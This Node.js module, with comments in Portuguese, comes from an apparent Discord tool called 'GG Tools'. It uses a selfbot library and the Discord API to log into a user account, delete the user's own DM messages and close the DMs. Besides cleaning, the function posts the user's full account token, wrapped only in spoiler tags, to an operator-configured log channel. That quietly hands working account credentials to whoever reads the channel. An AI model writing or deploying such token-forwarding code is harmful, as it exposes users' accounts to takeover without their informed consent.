const { Client } = require('discord.js-selfbot-v13');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const { EmbedBuilder } = require('discord.js');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

/**
 * Limpa todas as mensagens enviadas pelo usuário em DMs (exceto grupos) e fecha as DMs (opcional).
 * @param {string} token Token da conta do usuário
 * @param {function} log Função de log (opcional)
 * @param {Interaction} interaction Interação associada (opcional)
 * @param {string} tokenType Tipo de token ('bot' ou 'conta')
 * @param {Array<string>} whitelist Lista de IDs de usuários para ignorar (opcional)
 * @param {boolean} closeDMs Se deve fechar as DMs após limpar (default: true)
 * @returns {Promise<{deleted: number, closed: number, errors: number}>}
 */
async function cleanUserDMs(token, log = () => {}, interaction = null, tokenType = 'conta', whitelist = [], closeDMs = true) {
  if (tokenType === 'bot') {
    if (interaction) {
      await interaction.editReply({ content: '`❌` Bots não podem limpar DMs. Função disponível apenas para contas de usuário.', flags: 64 });
    }
    throw new Error('Bots não podem limpar DMs.');
  }
  // Se for usado em contexto de configuração, busque o token do usuário: tokens_<userId>
  const client = new Client({ checkUpdate: false });
  let deleted = 0;
  let closed = 0;
  let errors = 0;
  const delay = ms => new Promise(res => setTimeout(res, ms));

  await new Promise((resolve, reject) => {
    client.once('ready', resolve);
    client.login(token).catch(reject);
  });

  try {
    // Buscar todas as DMs via API (não só cache)
    const res = await fetch('https://discord.com/api/v10/users/@me/channels', {
      headers: { Authorization: token },
    });
    if (!res.ok) {
      log(`Erro ao buscar DMs via API: ${res.status}`);
      client.destroy();
      throw new Error('Não foi possível buscar as DMs. Token inválido ou permissão insuficiente.');
    }
    const channels = await res.json();
    const dms = channels.filter(c => c.type === 1 && (!whitelist || !whitelist.includes(c.recipients?.[0]?.id)));
    log(`Encontradas ${dms.length} DMs (privadas, sem grupos, filtradas por whitelist).`);
    for (const dm of dms) {
      let lastId = null;
      let keepGoing = true;
      while (keepGoing) {
        let url = `https://discord.com/api/v10/channels/${dm.id}/messages?limit=100`;
        if (lastId) url += `&before=${lastId}`;
        const resMsg = await fetch(url, {
          headers: { Authorization: token },
        });
        if (!resMsg.ok) {
          log(`Erro ao buscar mensagens em DM ${dm.id}: ${resMsg.status}`);
          errors++;
          break;
        }
        const messages = await resMsg.json();
        if (!Array.isArray(messages) || messages.length === 0) break;
        for (const msg of messages) {
          lastId = msg.id;
          if (msg.author && msg.author.id === client.user.id) {
            // Apagar mensagem
            try {
              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages/${msg.id}`, {
                method: 'DELETE',
                headers: { Authorization: token },
              });
              deleted++;
              log(`Mensagem apagada em DM ${dm.id}: ${msg.id}`);
              await delay(1500);
            } catch (e) {
              log(`Erro ao apagar mensagem ${msg.id} em DM ${dm.id}`);
              errors++;
            }
          }
        }
        if (messages.length < 100) keepGoing = false;
      }
      // Fechar DM (apenas se closeDMs for true)
      if (closeDMs) {
        try {
          await fetch(`https://discord.com/api/v10/channels/${dm.id}`, {
            method: 'DELETE',
            headers: { Authorization: token },
          });
          closed++;
          log(`DM ${dm.id} fechada.`);
          await delay(2000);
        } catch (e) {
          log(`Erro ao fechar DM ${dm.id}`);
          errors++;
        }
      }
    }
    const result = { deleted, closed, errors };
    // Enviar log para canal do Discord se interaction for fornecido
    if (interaction) {
      const logChannelId = config.log_clean_dm;
      if (logChannelId) {
        const logChannel = interaction.client.channels.cache.get(logChannelId);
        if (logChannel) {
          const embed = new EmbedBuilder()
            .setTitle('🧹 Limpar DMs')
            .setColor(0x5865F2)
            .addFields(
              { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
              { name: 'Token', value: `||${token}||`, inline: false },
              { name: 'Apagadas', value: `${deleted}`, inline: true },
              { name: 'Fechadas', value: `${closed}`, inline: true },
              { name: 'Falhas', value: `${errors}`, inline: true },
              { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
            )
            .setFooter({ text: 'GG Tools' });
          logChannel.send({ embeds: [embed] });
        }
      }
    }
    client.destroy();
    return result;
  } catch (err) {
    client.destroy();
    throw err;
  }
}

module.exports = { cleanUserDMs }; 